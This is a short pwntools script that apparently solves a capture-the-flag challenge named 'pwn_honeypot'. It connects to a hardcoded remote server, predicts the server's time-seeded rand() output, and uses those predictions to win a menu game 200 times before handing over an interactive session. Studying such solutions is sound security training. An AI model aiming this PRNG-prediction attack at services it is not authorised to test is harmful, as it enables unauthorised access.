#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('pwn_honeypot')

host = args.HOST or '206.81.24.129'
port = int(args.PORT or 1340)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.entry:x}
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['tmux', 'split', '-h']
# Pwntools custom functions
def _snd(s):
    io.send(str(s))
def _sndl(s):
    io.sendline(str(s))
def _snda(a,s):
    io.sendafter(str(a),str(s))
def _sndal(a,s):
    io.sendlineafter(str(a),str(s))
def _rcvu(s):
    return io.recvuntil(str(s))
def _rcva():
    return io.recvall()
def _rcvn(n):
    return io.recv(n)
def _rcvl():
    return io.recvline()


from time import sleep
from ctypes import *
libc = CDLL('/lib64/libc.so.6')

io = start()
seed = libc.time(0)
libc.srand(seed)

_sndal('your name?', 'misu')

def do():
    _sndal('Enter option:', 2)
    _sndal('Option: ', 1)
    _sndal('Enter option:', 3)
    libc.rand()
    attack = libc.rand() & 3
    print("[+] Attack type: {}".format(attack))
    sleep(0.1)
    _sndal('Option: ', attack)
    sleep(0.1)


for i in range(200):
    do()

io.interactive()

